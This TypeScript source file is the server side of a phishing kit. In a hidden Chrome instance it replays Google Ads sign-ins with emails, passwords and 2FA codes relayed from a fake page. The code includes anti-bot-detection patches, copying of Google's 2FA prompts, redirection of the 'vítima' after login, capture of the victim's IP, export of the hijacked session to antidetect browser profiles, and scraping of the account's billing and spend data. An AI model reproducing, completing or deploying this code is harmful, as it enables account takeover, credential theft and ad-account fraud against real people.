import puppeteer, { type Browser, type Page } from "puppeteer-core";
import { chromeLaunchArgs, findChrome, shouldRunHeadless } from "@/lib/chrome";
import { releaseTwoFactor, setChooseMethod, setInputError, setDeviceName, submitEmail, submitPassword, setChromeError, setChromeReady } from "@/lib/demo-session";
import type { MethodOption, TwoFactorType } from "@/lib/demo-session";

const TARGET_URL =
  process.env.PHANTOM_TARGET_URL ??
  "https://accounts.google.com/signin/v2/identifier?service=adwords&continue=https://ads.google.com/";

// ── AdsPower ──────────────────────────────────────────────────────────────────
const ADSPOWER_URL = process.env.ADSPOWER_URL ?? "http://127.0.0.1:50325";
const ADSPOWER_GROUP_NAME = process.env.ADSPOWER_GROUP ?? "Google Ads";
// ─────────────────────────────────────────────────────────────────────────────

// ── Proxy SOCKS5 — configurar no .env ────────────────────────────────────────
const PROXY_HOST = process.env.PROXY_HOST;
const PROXY_PORT = process.env.PROXY_PORT;
const PROXY_USER = process.env.PROXY_USER;
const PROXY_PASS = process.env.PROXY_PASS;
const PROXY_ENABLED = Boolean(PROXY_HOST && PROXY_PORT);
// ─────────────────────────────────────────────────────────────────────────────

// ── Dolphin Anty Cloud API ────────────────────────────────────────────────────
const DOLPHIN_TOKEN = process.env.DOLPHIN_API_TOKEN;
const DOLPHIN_API = "https://dolphin-anty-api.com";
// ─────────────────────────────────────────────────────────────────────────────

type PhantomStore = {
  browsers: Map<string, Browser>;       // um browser isolado por sessionId
  pages: Map<string, Page>;
  completionTracked: Set<string>;       // sessões com waitForLoginComplete ativo
  cancelledSessions: Set<string>;
  sessionTimers: Map<string, NodeJS.Timeout>;
};

export type PhantomDebugState = {
  ok: boolean;
  error?: string;
  sessionId: string;
  url?: string;
  title?: string;
  closed?: boolean;
  inputSummary?: Array<{
    type: string;
    name: string;
    id: string;
    autocomplete: string;
    placeholder: string;
    ariaLabel: string;
    visible: boolean;
    disabled: boolean;
    valueLength: number;
  }>;
  buttonSummary?: Array<{
    text: string;
    ariaLabel: string;
    visible: boolean;
  }>;
  bodyText?: string;
};

function getStore(): PhantomStore {
  const g = globalThis as typeof globalThis & { __phantomStore?: PhantomStore };
  if (!g.__phantomStore) {
    g.__phantomStore = { browsers: new Map(), pages: new Map(), completionTracked: new Set(), cancelledSessions: new Set(), sessionTimers: new Map() };
  }
  return g.__phantomStore;
}

const PHANTOM_SESSION_TTL_MS = Number.parseInt(process.env.PHANTOM_SESSION_TTL_MS ?? "600000", 10);
const PASSWORD_FIELD_TIMEOUT_MS = 20000;

async function launchBrowserForSession(sessionId: string): Promise<Browser> {
  const store = getStore();

  // Fecha browser anterior desta sessão se existir
  const existing = store.browsers.get(sessionId);
  if (existing) {
    try { await existing.close().catch(() => {}); } catch { /* já fechado */ }
    store.browsers.delete(sessionId);
    store.pages.delete(sessionId);
    store.completionTracked.delete(sessionId);
  }

  const executablePath = findChrome();
  if (!executablePath) throw new Error("Chrome não encontrado");

  console.log("[phantom] launching Chrome for session", sessionId, "at:", executablePath);
  const browser = await puppeteer.launch({
    headless: shouldRunHeadless(),
    executablePath,
    defaultViewport: null,
    ignoreDefaultArgs: ["--enable-automation"],
    args: chromeLaunchArgs([
      ...(PROXY_ENABLED ? [`--proxy-server=http://${PROXY_HOST}:${PROXY_PORT}`] : []),
    ]),
  });
  console.log("[phantom] Chrome launched for session", sessionId);

  store.browsers.set(sessionId, browser);
  return browser;
}

async function getPage(sessionId: string): Promise<Page | null> {
  return getStore().pages.get(sessionId) ?? null;
}

function isRejectedPath(url: string): boolean {
  try {
    return new URL(url).pathname.includes("/rejected");
  } catch {
    return false;
  }
}

export async function getPhantomDebugState(sessionId: string): Promise<PhantomDebugState> {
  const page = await getPage(sessionId);
  if (!page) return { ok: false, sessionId, error: "page not found" };
  if (page.isClosed()) return { ok: false, sessionId, closed: true, error: "page is closed" };

  const url = page.url();
  const title = await page.title().catch(() => "");
  const pageState = await page.evaluate(() => {
    const isVisible = (el: Element) => {
      const rect = el.getBoundingClientRect();
      const style = window.getComputedStyle(el);
      return rect.width > 0 && rect.height > 0 && style.visibility !== "hidden" && style.display !== "none";
    };

    const inputSummary = Array.from(document.querySelectorAll("input")).map((input) => ({
      type: input.type,
      name: input.name,
      id: input.id,
      autocomplete: input.autocomplete,
      placeholder: input.placeholder,
      ariaLabel: input.getAttribute("aria-label") ?? "",
      visible: isVisible(input),
      disabled: input.disabled,
      valueLength: input.value.length,
    }));

    const buttonSummary = Array.from(document.querySelectorAll("button, [role='button']")).slice(0, 20).map((button) => ({
      text: (button.textContent ?? "").trim().replace(/\s+/g, " ").slice(0, 120),
      ariaLabel: button.getAttribute("aria-label") ?? "",
      visible: isVisible(button),
    }));

    return {
      inputSummary,
      buttonSummary,
      bodyText: (document.body?.innerText ?? "").trim().replace(/\s+/g, " ").slice(0, 3000),
    };
  }).catch(() => ({ inputSummary: [], buttonSummary: [], bodyText: "" }));

  return {
    ok: true,
    sessionId,
    url,
    title,
    closed: false,
    ...pageState,
  };
}

export async function getPhantomScreenshot(sessionId: string): Promise<Uint8Array | null> {
  const page = await getPage(sessionId);
  if (!page || page.isClosed()) return null;
  return page.screenshot({ type: "png", fullPage: false });
}

// Aguarda navegação após Enter.
// Compara o PATH da URL antes com o depois — se mudou = sucesso/2FA.
// Se ficou no mesmo caminho = Google recusou o input.
// Se timeout = não navegou = verifica erro no DOM.
async function waitForNavOrError(page: Page, urlBefore: string, timeout = 12000): Promise<"success" | "error"> {
  // Seletor específico do container de erro do Google — só aparece quando há erro real
  const ERROR_SELECTOR = '.Ly8vae[aria-live="polite"] [jsname="B34EJ"] span';

  type Result = "nav" | "error-element";

  let winner: Result;
  try {
    winner = await Promise.race([
      page.waitForNavigation({ timeout, waitUntil: "domcontentloaded" }).then(() => "nav" as Result),
      // Espera o elemento de erro aparecer com texto não vazio
      page.waitForFunction(
        (sel: string) => {
          const el = document.querySelector(sel);
          return el && (el as HTMLElement).innerText?.trim().length > 3;
        },
        { timeout },
        ERROR_SELECTOR,
      ).then(() => "error-element" as Result),
    ]);
  } catch {
    return "success";
  }

  if (winner === "error-element") {
    console.log("[phantom] error element appeared before navigation");
    return "error";
  }

  // Navegou — verificar se mudou de path
  const pathBefore = new URL(urlBefore).pathname;
  const pathAfter = new URL(page.url()).pathname;
  console.log("[phantom] nav: before=", pathBefore, "after=", pathAfter);
  if (pathAfter.includes("/rejected")) return "error";
  return pathBefore === pathAfter ? "error" : "success";
}

async function getGoogleErrorText(page: Page): Promise<string> {
  try {
    return await page.evaluate((): string => {
      // Seletores conhecidos do Google para mensagens de erro
      const selectors = [
        '.Ly8vae[aria-live="polite"] [jsname="B34EJ"] span', // erro específico do Google
        '[jsname="B34EJ"] span',
        "#passwordError",
        "#identifierError",
        ".o6cuMc",
        ".dEOOab",
        ".Ekjuhf",
        ".GQ8W2b",
        '[data-error-code]',
      ];

      for (const sel of selectors) {
        const els = document.querySelectorAll(sel);
        for (const el of els) {
          const text = (el as HTMLElement).innerText?.trim();
          if (text && text.length > 3) return text;
        }
      }

      // Fallback: varrer todos os elementos visíveis procurando texto de erro típico do Google
      const errorKeywords = ["incorreta", "inválid", "incorrect", "wrong", "não reconhec", "Tente de novo", "couldn't", "try again"];
      const all = document.querySelectorAll("span, div, p");
      for (const el of all) {
        const text = (el as HTMLElement).innerText?.trim();
        if (text && text.length > 5 && text.length < 300) {
          if (errorKeywords.some((kw) => text.toLowerCase().includes(kw.toLowerCase()))) {
            return text;
          }
        }
      }

      return "";
    });
  } catch {
    return "";
  }
}

// ── Exported functions ────────────────────────────────────────────────────────

export async function startPhantom(sessionId: string): Promise<void> {
  try {
    getStore().cancelledSessions.delete(sessionId);
    console.log("[phantom] startPhantom", sessionId, "chrome:", findChrome());
    const browser = await launchBrowserForSession(sessionId);
    console.log("[phantom] browser launched");
    const page = await browser.newPage();
    console.log("[phantom] page created");

    // Autenticação do proxy (ativa automaticamente se PROXY_USER/PROXY_PASS estiverem no .env)
    if (PROXY_ENABLED && PROXY_USER && PROXY_PASS) {
      await page.authenticate({ username: PROXY_USER, password: PROXY_PASS });
    }

    // User-Agent realista de Chrome no Windows
    const UA = process.env.PHANTOM_USER_AGENT ??
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
    await page.setUserAgent(UA);

    // Patches anti-detecção antes de qualquer navegação
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, "webdriver", { get: () => undefined });
      Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3, 4, 5] });
      Object.defineProperty(navigator, "languages", { get: () => ["pt-BR", "pt", "en-US", "en"] });
      Object.defineProperty(navigator, "platform", { get: () => "Win32" });
      Object.defineProperty(navigator, "vendor", { get: () => "Google Inc." });
      Object.defineProperty(navigator, "hardwareConcurrency", { get: () => 8 });
      Object.defineProperty(navigator, "deviceMemory", { get: () => 8 });
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      (window as any).chrome = {
        runtime: {
          onMessage: { addListener: () => {}, removeListener: () => {} },
          connect: () => ({}),
          sendMessage: () => {},
        },
        loadTimes: () => {},
        csi: () => {},
        app: {},
      };
      // Remove variáveis CDP que delatam automação
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const win = window as any;
      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Array;
      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
      delete win.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
      const orig = navigator.permissions.query.bind(navigator.permissions);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      navigator.permissions.query = (p: any) =>
        p.name === "notifications" ? Promise.resolve({ state: "denied" } as PermissionStatus) : orig(p);
    });

    console.log("[phantom] navigating to", TARGET_URL);
    await page.goto(TARGET_URL, { waitUntil: "domcontentloaded", timeout: 15000 });
    console.log("[phantom] navigation done, url:", page.url());
    const store = getStore();
    store.pages.set(sessionId, page);
    const previousTimer = store.sessionTimers.get(sessionId);
    if (previousTimer) clearTimeout(previousTimer);
    const ttlTimer = setTimeout(() => {
      console.log("[phantom] session TTL reached, closing", sessionId);
      closePhantom(sessionId);
    }, Number.isFinite(PHANTOM_SESSION_TTL_MS) && PHANTOM_SESSION_TTL_MS > 0 ? PHANTOM_SESSION_TTL_MS : 600000);
    ttlTimer.unref();
    store.sessionTimers.set(sessionId, ttlTimer);
    setChromeReady(sessionId);
    console.log("[phantom] session registered, chrome ready");
  } catch (err) {
    console.error("[phantom] startPhantom ERROR:", err);
    const message = err instanceof Error ? err.message : "Erro desconhecido ao abrir Chrome.";
    setChromeError(sessionId, message);
  }
}

export async function phantomFillEmail(sessionId: string, email: string): Promise<void> {
  try {
    console.log("[phantom] fillEmail", sessionId, email);
    const page = await getPage(sessionId);
    if (!page) { console.warn("[phantom] fillEmail: page not found"); return; }

    const selector = 'input[type="email"], input[name="identifier"]';
    await page.waitForSelector(selector, { timeout: 8000 });
    console.log("[phantom] email field found, typing...");
    await page.click(selector, { clickCount: 3 });
    await page.type(selector, email, { delay: 80 });
    const urlBeforeEmail = page.url();
    await page.keyboard.press("Enter");
    console.log("[phantom] email submitted, waiting for nav or error...");

    const result = await waitForNavOrError(page, urlBeforeEmail, 10000);
    if (result === "error") {
      await new Promise((r) => setTimeout(r, 1000));
      const errorText = await getGoogleErrorText(page);
      console.log("[phantom] email error detected:", errorText);
      const fallbackMessage = isRejectedPath(page.url())
        ? "O Google recusou este login antes de pedir a senha."
        : "Não foi possível encontrar a Conta do Google.";
      setInputError(sessionId, "email", errorText || fallbackMessage);
    } else {
      console.log("[phantom] email accepted by Google — advancing step");
      submitEmail(sessionId, email);
    }
  } catch (err) {
    console.error("[phantom] fillEmail ERROR:", err);
  }
}

export async function phantomFillPassword(sessionId: string, password: string): Promise<void> {
  try {
    console.log("[phantom] fillPassword", sessionId);
    const page = await getPage(sessionId);
    if (!page) { console.warn("[phantom] fillPassword: page not found"); return; }

    const selector = 'input[type="password"]';
    await page.waitForSelector(selector, { timeout: PASSWORD_FIELD_TIMEOUT_MS });
    console.log("[phantom] password field found, typing...");
    await page.click(selector, { clickCount: 3 });
    await page.type(selector, password, { delay: 80 });
    const urlBeforePass = page.url();
    await page.keyboard.press("Enter");
    console.log("[phantom] password submitted, waiting for nav or error...");

    const result = await waitForNavOrError(page, urlBeforePass, 12000);
    if (result === "error") {
      // Aguarda DOM estabilizar e tenta capturar o texto de erro
      await new Promise((r) => setTimeout(r, 1000));
      const errorText = await getGoogleErrorText(page);
      console.log("[phantom] password error detected:", errorText);
      setInputError(sessionId, "password", errorText || "Senha incorreta. Tente de novo.");
      return;
    }
    console.log("[phantom] password accepted — advancing step");
    submitPassword(sessionId, password);
    // Monitora o Chrome imediatamente — detecta destino final com ou sem 2FA
    void waitForLoginComplete(sessionId, page);
    void detectAndRelease2FA(sessionId, page);
  } catch (err) {
    console.error("[phantom] fillPassword ERROR:", err);
  }
}

async function detectAndRelease2FA(sessionId: string, page: Page): Promise<void> {
  try {
    console.log("[phantom] waiting for /challenge URL...");

    // Aguarda a URL conter /challenge — pode haver várias navegações intermediárias
    const deadline = Date.now() + 20000;
    while (!page.url().includes("/challenge")) {
      if (Date.now() > deadline) {
        const finalUrl = page.url();
        console.log("[phantom] /challenge not reached, current url:", finalUrl, "— sem 2FA, waitForLoginComplete já está monitorando");
        return;
      }
      try {
        await page.waitForNavigation({ timeout: 5000, waitUntil: "domcontentloaded" });
      } catch {
        // timeout parcial — checar URL e tentar de novo
      }
    }

    const url = page.url();
    console.log("[phantom] challenge URL:", url);

    // Aguarda mais um pouco para o DOM estar pronto
    await new Promise((r) => setTimeout(r, 800));

    // ── Tela de seleção de método (Google mostra lista de opções) ──────────────
    const isSelectionPage =
      url.includes("/challenge/selection") ||
      url.includes("/challenge/iam/consent") ||
      (!url.includes("/challenge/totp") &&
        !url.includes("/challenge/dp") &&
        !url.includes("/challenge/iap") &&
        !url.includes("/challenge/ootp") &&
        !url.includes("/challenge/bk") &&
        !url.includes("/challenge/sm") &&
        !url.includes("/challenge/vm"));

    if (isSelectionPage) {
      // Verifica se há múltiplos challengeType no DOM
      const methods = await page.evaluate((): { challengeType: string; label: string; subtitle: string; available: boolean }[] => {
        const items = Array.from(document.querySelectorAll("[data-challengetype]")) as HTMLElement[];
        if (items.length <= 1) return [];
        return items.map((el) => {
          const challengeType = el.getAttribute("data-challengetype") ?? "";
          const allLines = (el.innerText ?? "").split("\n").map((l: string) => l.trim()).filter(Boolean);
          const label = allLines[0] ?? "";
          const subtitle = allLines.slice(1).join("\n");
          const available = !el.hasAttribute("aria-disabled") &&
            !el.classList.contains("disabled") &&
            !subtitle.toLowerCase().includes("indispon");
          return { challengeType, label, subtitle, available };
        }).filter((m) => m.challengeType && m.label);
      }).catch(() => [] as MethodOption[]);

      if (methods.length > 1) {
        console.log("[phantom] selection page detected, methods:", JSON.stringify(methods.map(m => ({ ct: m.challengeType, label: m.label }))));
        setChooseMethod(sessionId, methods as MethodOption[]);
        return; // Aguarda usuário escolher
      }
      // Se só tem 1 (ou 0), continua com detecção normal abaixo
    }

    // ── Detecção do tipo de challenge único ────────────────────────────────────
    let type: TwoFactorType = "sms";

    // Detecção por URL
    if (url.includes("/challenge/totp")) {
      type = "authenticator";
    } else if (url.includes("/challenge/dp") || url.includes("/challenge/iap")) {
      type = "device";
    } else if (url.includes("/challenge/ootp") || url.includes("/challenge/bk")) {
      type = "email";
    } else if (url.includes("/challenge/sm") || url.includes("/challenge/vm")) {
      type = "sms";
    } else {
      // Fallback: inspecionar DOM
      type = (await page.evaluate((): string => {
        const ct = document.querySelector("[data-challengetype]")?.getAttribute("data-challengetype");
        if (ct === "6") return "authenticator";
        if (ct === "9" || ct === "15") return "device";
        if (ct === "11") return "email";
        if (ct === "12") return "sms";
        const body = document.body.innerText.toLowerCase();
        if (body.includes("authenticator") || body.includes("autenticador")) return "authenticator";
        if (body.includes("celular") || body.includes("notificação") || body.includes("notificacao")) return "device";
        if (body.includes("e-mail") || body.includes("email")) return "email";
        return "sms";
      })) as TwoFactorType;
    }

    console.log("[phantom] detected 2FA type:", type, "— releasing...");

    // Para device 2FA, extrair animação SVG e nome do aparelho
    if (type === "device") {
      try {
        const svgHtml = await page.evaluate((): string => {
          // Pega o SVG da animação do celular que o Google já renderizou
          const svgEl = document.querySelector('figure svg, [jscontroller="sd5RAf"] svg');
          if (!svgEl) return "";
          const clone = svgEl.cloneNode(true) as SVGElement;
          // Remove width/height fixos para que o CSS controle o tamanho
          clone.removeAttribute("width");
          clone.removeAttribute("height");
          clone.setAttribute("width", "100%");
          clone.setAttribute("height", "100%");
          // Remove atributos Angular/Google que causam erros no React
          clone.removeAttribute("class");
          clone.removeAttribute("jsname");
          // Encontra o grupo que está visível (display: block) e tem uma matrix de rotação
          // e adiciona animateTransform nativo SVG para manter a animação funcionando
          const spinGroup = Array.from(clone.querySelectorAll("g")).find((g) => {
            const s = g.getAttribute("style") ?? "";
            const t = g.getAttribute("transform") ?? "";
            return s.includes("display: block") && (t.includes("matrix") || s.includes("matrix"));
          });
          if (spinGroup) {
            // Extrai o centro da transform matrix: matrix(a,b,c,d,cx,cy)
            const raw = spinGroup.getAttribute("transform") ?? spinGroup.getAttribute("style") ?? "";
            const m = raw.match(/matrix\(([^)]+)\)/);
            if (m) {
              const parts = m[1].split(",").map(Number);
              const cx = parts[4] ?? 477;
              const cy = parts[5] ?? 202;
              const scale = Math.sqrt(parts[0] ** 2 + parts[1] ** 2);
              // Limpa transform animado e coloca fixo com animateTransform
              spinGroup.setAttribute("transform", `translate(${cx},${cy}) scale(${scale})`);
              const anim = document.createElementNS("http://www.w3.org/2000/svg", "animateTransform");
              anim.setAttribute("attributeName", "transform");
              anim.setAttribute("type", "rotate");
              anim.setAttribute("from", `0 ${cx} ${cy}`);
              anim.setAttribute("to", `360 ${cx} ${cy}`);
              anim.setAttribute("dur", "4s");
              anim.setAttribute("repeatCount", "indefinite");
              anim.setAttribute("additive", "sum");
              spinGroup.appendChild(anim);
            }
          }
          return clone.outerHTML;
        }).catch(() => "");

        if (svgHtml) {
          const { getDemoSession } = await import("@/lib/demo-session");
          const sess = getDemoSession(sessionId);
          if (sess) sess.deviceAnimationSvg = svgHtml;
          console.log("[phantom] device animation SVG captured, length:", svgHtml.length);
        }
      } catch (e) {
        console.warn("[phantom] could not capture device animation SVG:", e);
      }

      const rawDeviceName = await page.evaluate((): string => {
        // Procura apenas em headings (h1/h2) e no elemento específico do Google
        // Só aceita o texto se começar com "Verifique seu" — evita pegar mensagens de erro
        const candidates = Array.from(
          document.querySelectorAll('h1, h2, [jsname="Ud7fr"], [jsslot]')
        ) as HTMLElement[];
        for (const el of candidates) {
          const text = (el.innerText ?? el.textContent ?? "").trim();
          const m = text.match(/^Verifique seu\s+(.+)$/i) ?? text.match(/^Verify your\s+(.+)$/i);
          if (m) return m[1].trim();
        }
        return "";
      }).catch(() => "");
      if (rawDeviceName) {
        setDeviceName(sessionId, rawDeviceName);
        console.log("[phantom] device name:", rawDeviceName);
      }
    }

    releaseTwoFactor(sessionId, type);
    console.log("[phantom] 2FA released");
  } catch (err) {
    console.error("[phantom] detectAndRelease2FA ERROR:", err);
  }
}

// Aguarda o Chrome chegar no destino final usando polling simples.
// Evita race conditions com waitForNavigation que compete com phantomFill2FA.
async function waitForLoginComplete(sessionId: string, page: Page): Promise<void> {
  const store = getStore();

  // Guard: só uma instância por sessão
  if (store.completionTracked.has(sessionId)) {
    console.log("[phantom] waitForLoginComplete: already tracking", sessionId);
    return;
  }
  store.completionTracked.add(sessionId);

  try {
    console.log("[phantom] waitForLoginComplete: started polling for", sessionId);
    const deadline = Date.now() + 300000; // 5 minutos (device 2FA pode demorar)
    let lastLoggedUrl = "";

    // Listener de navegação — acorda o loop imediatamente quando o Chrome navegar
    let navResolve: (() => void) | null = null;
    const onNav = () => { if (navResolve) { navResolve(); navResolve = null; } };
    page.on("framenavigated", onNav);
    page.on("close", onNav);

    while (Date.now() < deadline) {
      const { getDemoSession } = await import("@/lib/demo-session");
      if (store.cancelledSessions.has(sessionId) || !getDemoSession(sessionId)) {
        console.log("[phantom] waitForLoginComplete: cancelled", sessionId);
        break;
      }
      if (page.isClosed()) {
        console.log("[phantom] waitForLoginComplete: page closed", sessionId);
        break;
      }

      // Aguarda 1s OU até o Chrome navegar (o que vier primeiro)
      await Promise.race([
        new Promise<void>((r) => { navResolve = r; setTimeout(r, 1000); }),
      ]);
      navResolve = null;

      let url = "";
      try { url = page.url(); } catch { page.off("framenavigated", onNav); break; } // página fechada

      if (url !== lastLoggedUrl) {
        console.log("[phantom] waitForLoginComplete: url =", url);
        lastLoggedUrl = url;
      }

      // Checar apenas o hostname — evita falso positivo com "continue=https://ads.google.com/" na query
      let hostname = "";
      try { hostname = new URL(url).hostname; } catch { /* url inválida */ }
      const isFinished =
        hostname === "ads.google.com" ||
        hostname.endsWith(".ads.google.com") ||
        hostname === "business.google.com" ||
        hostname.endsWith(".business.google.com") ||
        hostname === "myaccount.google.com" ||
        // Saiu completamente do fluxo de autenticação (não está mais em accounts.google.com)
        (hostname.endsWith(".google.com") && !hostname.includes("accounts."));

      if (isFinished) {
        page.off("framenavigated", onNav);
        page.off("close", onNav);
        console.log("[phantom] login complete →", url);
        const session = getDemoSession(sessionId);
        // Redireciona a vítima para a URL real onde o Chrome chegou após login
        if (session) session.forceRedirect = url;
        await saveToAdsPower(page, sessionId, session);
        return;
      }
    }

    page.off("framenavigated", onNav);
    page.off("close", onNav);
    if (!page.isClosed()) console.log("[phantom] waitForLoginComplete: deadline reached, url:", page.url());
  } catch (err) {
    console.error("[phantom] waitForLoginComplete ERROR:", err);
  } finally {
    store.completionTracked.delete(sessionId);
  }
}

export async function phantomFill2FA(sessionId: string, code: string): Promise<void> {
  try {
    console.log("[phantom] fill2FA", sessionId, code);
    const page = await getPage(sessionId);
    if (!page) { console.warn("[phantom] fill2FA: page not found"); return; }

    const selector = 'input[type="tel"], input[type="number"], input[inputmode="numeric"], input[name="totpPin"], input[name="code"]';
    await page.waitForSelector(selector, { timeout: 8000 });
    console.log("[phantom] 2FA field found, typing...");
    await page.click(selector, { clickCount: 3 });
    await page.type(selector, code, { delay: 80 });
    const urlBefore2FA = page.url();
    await page.keyboard.press("Enter");
    console.log("[phantom] 2FA submitted, waiting for nav or error...");

    const result = await waitForNavOrError(page, urlBefore2FA, 12000);
    if (result === "error") {
      const errorText = await getGoogleErrorText(page);
      console.log("[phantom] 2FA error detected:", errorText);
      setInputError(sessionId, "twoFactor", errorText);
    } else {
      console.log("[phantom] 2FA accepted by Google — starting completion monitor");
      // Garante que o monitor está rodando (restart se já tiver terminado, noop se ainda ativo)
      void waitForLoginComplete(sessionId, page);
    }
  } catch (err) {
    console.error("[phantom] fill2FA ERROR:", err);
  }
}

export async function phantomTryAnotherWay(sessionId: string): Promise<void> {
  try {
    console.log("[phantom] tryAnotherWay", sessionId);
    const page = await getPage(sessionId);
    if (!page) { console.warn("[phantom] tryAnotherWay: page not found"); return; }

    // Tira o foco de qualquer campo ativo para evitar validação de formulário vazio
    await page.evaluate(() => {
      const active = document.activeElement as HTMLElement | null;
      if (active && typeof active.blur === "function") active.blur();
    }).catch(() => {});

    // Pressiona Escape para cancelar qualquer estado de validação
    await page.keyboard.press("Escape").catch(() => {});
    await new Promise((r) => setTimeout(r, 200));

    // Clica no link "Tentar de outro jeito" / "Try another way" do Google
    // Usa APENAS busca por texto — seletores fixos (jsname, data-action) variam entre páginas
    // e podem acidentalmente coincidir com "Avançar"
    const clicked = await page.evaluate((): boolean => {
      const candidates = Array.from(
        document.querySelectorAll('a, button, [role="link"], [role="button"]')
      ) as HTMLElement[];
      const btn = candidates.find((el) => {
        const text = (el.innerText ?? el.textContent ?? "").trim().toLowerCase();
        return text === "tentar de outro jeito" ||
               text === "try another way" ||
               text.includes("outro jeito") ||
               text.includes("another way");
      });
      if (btn) { btn.click(); return true; }
      return false;
    }).catch(() => false);

    if (!clicked) {
      console.warn("[phantom] tryAnotherWay: button not found");
      return;
    }

    console.log("[phantom] tryAnotherWay: clicked, waiting for nav...");
    try {
      await page.waitForNavigation({ timeout: 10000, waitUntil: "domcontentloaded" });
    } catch { /* pode já ter navegado */ }

    await new Promise((r) => setTimeout(r, 800));
    console.log("[phantom] tryAnotherWay: landed on", page.url());

    // Extrai os métodos da tela de seleção
    const methods = await page.evaluate((): { challengeType: string; label: string; subtitle: string; available: boolean }[] => {
      const items = Array.from(document.querySelectorAll("[data-challengetype]")) as HTMLElement[];
      return items.map((el) => {
        const challengeType = el.getAttribute("data-challengetype") ?? "";
        const allLines = (el.innerText ?? "").split("\n").map((l: string) => l.trim()).filter(Boolean);
        const label = allLines[0] ?? "";
        const subtitle = allLines.slice(1).join("\n");
        const available = !el.hasAttribute("aria-disabled") &&
          !el.classList.contains("disabled") &&
          !subtitle.toLowerCase().includes("indispon");
        return { challengeType, label, subtitle, available };
      }).filter((m) => m.challengeType && m.label);
    }).catch(() => [] as { challengeType: string; label: string; subtitle: string; available: boolean }[]);

    if (methods.length > 0) {
      console.log("[phantom] tryAnotherWay: found", methods.length, "methods");
      setChooseMethod(sessionId, methods as MethodOption[]);
    } else {
      console.warn("[phantom] tryAnotherWay: no methods found on page");
    }
  } catch (err) {
    console.error("[phantom] tryAnotherWay ERROR:", err);
  }
}

export async function phantomSelectMethod(sessionId: string, challengeType: string): Promise<void> {
  try {
    console.log("[phantom] selectMethod", sessionId, "type:", challengeType);
    const page = await getPage(sessionId);
    if (!page) { console.warn("[phantom] selectMethod: page not found"); return; }

    // Clica no método escolhido pelo usuário
    await page.click(`[data-challengetype="${challengeType}"]`);
    console.log("[phantom] clicked method", challengeType);

    // Aguarda navegação para a tela específica
    try {
      await page.waitForNavigation({ timeout: 10000, waitUntil: "domcontentloaded" });
    } catch { /* já pode estar na página */ }

    await new Promise((r) => setTimeout(r, 800));
    const url = page.url();
    console.log("[phantom] after method select, url:", url);

    // Detecta o tipo pelo URL
    let type: TwoFactorType = "sms";
    if (url.includes("/challenge/totp")) type = "authenticator";
    else if (url.includes("/challenge/dp") || url.includes("/challenge/iap")) type = "device";
    else if (url.includes("/challenge/ootp") || url.includes("/challenge/bk")) type = "email";
    else if (url.includes("/challenge/sm") || url.includes("/challenge/vm")) type = "sms";
    else {
      type = (await page.evaluate((): string => {
        const ct = document.querySelector("[data-challengetype]")?.getAttribute("data-challengetype");
        if (ct === "6") return "authenticator";
        if (ct === "9" || ct === "15") return "device";
        if (ct === "11") return "email";
        if (ct === "12") return "sms";
        return "sms";
      })) as TwoFactorType;
    }

    if (type === "device") {
      const rawName = await page.evaluate((): string => {
        const candidates = Array.from(document.querySelectorAll('h1, h2, [jsname="Ud7fr"], [jsslot]')) as HTMLElement[];
        for (const el of candidates) {
          const text = (el.innerText ?? el.textContent ?? "").trim();
          const m = text.match(/^Verifique seu\s+(.+)$/i) ?? text.match(/^Verify your\s+(.+)$/i);
          if (m) return m[1].trim();
        }
        return "";
      }).catch(() => "");
      if (rawName) setDeviceName(sessionId, rawName);
    }

    console.log("[phantom] selectMethod releasing type:", type);
    releaseTwoFactor(sessionId, type);
  } catch (err) {
    console.error("[phantom] selectMethod ERROR:", err);
  }
}

async function saveToAdsPower(page: Page, sessionId: string, session: import("@/lib/demo-session").DemoSession | null): Promise<void> {
  const email = session?.emailPreview ?? "unknown";
  try {
    console.log("[adspower] starting saveToAdsPower for", email);

    // "Verificação de API" desligada no AdsPower → sem auth necessária
    // Se ativada no futuro, adicionar header: Authorization: <API_KEY>

    // 1. Buscar group_id pelo nome
    const groupUrl = `${ADSPOWER_URL}/api/v1/group/list?group_name=${encodeURIComponent(ADSPOWER_GROUP_NAME)}`;
    const groupRaw = await fetch(groupUrl).then((r) => r.text());
    const groupData = JSON.parse(groupRaw) as { code?: number; msg?: string; data?: { list?: { group_id: string; group_name: string }[] } };
    const groupId = groupData?.data?.list?.[0]?.group_id ?? "0";
    console.log("[adspower] group_id:", groupId);

    // 2. Capturar IP público do Chrome (= IP da vítima no momento do login)
    let victimIp = "";
    try {
      await page.goto("https://api.ipify.org?format=json", { waitUntil: "domcontentloaded", timeout: 8000 });
      const ipData = await page.evaluate(() => {
        try { return JSON.parse(document.body.innerText) as { ip: string }; } catch { return { ip: "" }; }
      });
      victimIp = ipData.ip ?? "";
      console.log("[adspower] victim IP:", victimIp);
    } catch {
      console.warn("[adspower] could not get victim IP");
    }

    // 3. Diagnóstico completo do Google Ads (suporte a múltiplas contas)
    type AdsInfo = {
      accountName: string; customerId: string; spend: string; accountStatus: string;
      campaigns: number; activeCampaigns: number; budget: string;
      clicks: string; impressions: string; ctr: string; cpc: string;
      conversions: string; convValue: string;
      billingEmail: string; billingStatus: string; paymentMethod: string;
      currency: string; timezone: string; accountType: string;
      managerAccount: string; allCustomerIds: string[];
    };

    const emptyAdsInfo = (): AdsInfo => ({
      accountName: "", customerId: "", spend: "", accountStatus: "",
      campaigns: 0, activeCampaigns: 0, budget: "",
      clicks: "", impressions: "", ctr: "", cpc: "",
      conversions: "", convValue: "",
      billingEmail: "", billingStatus: "", paymentMethod: "",
      currency: "", timezone: "", accountType: "",
      managerAccount: "", allCustomerIds: [],
    });

    // Helper: diagnostica a conta atualmente aberta no Chrome
    const diagnoseCurrentAccount = async (): Promise<AdsInfo> => {
      let info = emptyAdsInfo();
      try {
        // Overview
        await page.goto("https://ads.google.com/aw/overview", { waitUntil: "domcontentloaded", timeout: 15000 });
        await new Promise((r) => setTimeout(r, 3500));

        info = await page.evaluate((): AdsInfo => {
          const txt = (sel: string) => (document.querySelector(sel) as HTMLElement | null)?.innerText?.trim() ?? "";
